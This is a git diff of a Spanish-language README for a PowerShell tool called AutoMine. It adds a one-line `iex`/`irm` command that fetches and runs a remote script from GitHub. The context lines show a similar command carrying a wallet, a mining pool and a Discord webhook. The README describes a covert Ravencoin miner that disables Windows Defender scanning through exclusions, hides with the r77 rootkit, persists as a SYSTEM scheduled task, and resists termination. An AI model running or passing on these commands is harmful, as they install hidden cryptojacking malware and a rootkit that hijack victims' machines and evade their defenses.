@@ -4,6 +4,10 @@
 iex "& { $(irm 'https://raw.githubusercontent.com/UnfairAdventage/AutoMine/refs/heads/main/Mine.ps1') } -Wallet 'R9vXXZ2AXz14qg2eKmdNbJBacg5T9Bx7Vz' -Pool 'us-rvn.2miners.com:6060' -Algo 'kawpow' -DiscordWebhook 'https://discord.com/api/webhooks/1569376706031001620/PbWNqV0sdcSBQufI4bgkp28ZglG4oSpozVeo3o8t-mWAvHEgLqcYyCj6sNpQGHnraM2q'"
 ```
 
+```powershell 
+iex "& { $(irm 'https://raw.githubusercontent.com/UnfairAdventage/AutoMine/refs/heads/main/Mine.ps1') } -Diagnose"
+```
+
 Automatización avanzada de minería de Ravencoin (RVN) con GMiner en Windows. Integra persistencia vía Tarea Programada (SYSTEM), ocultamiento mediante Rootkit (r77), protección contra cierre (Proceso Crítico) y notificaciones vía Discord.
 
 El script (`Mine.ps1`) descarga GMiner, configura exclusiones de Windows Defender, se oculta usando un rootkit en memoria, se marca como proceso crítico del sistema y registra una tarea de inicio automático. Un "watcher" invisible monitorea el minero, lo reinicia si se cae y reporta el estado a un Webhook de Discord. Todo el proceso sobrevive a reinicios y es inmune a la finalización desde el Administrador de Tareas.
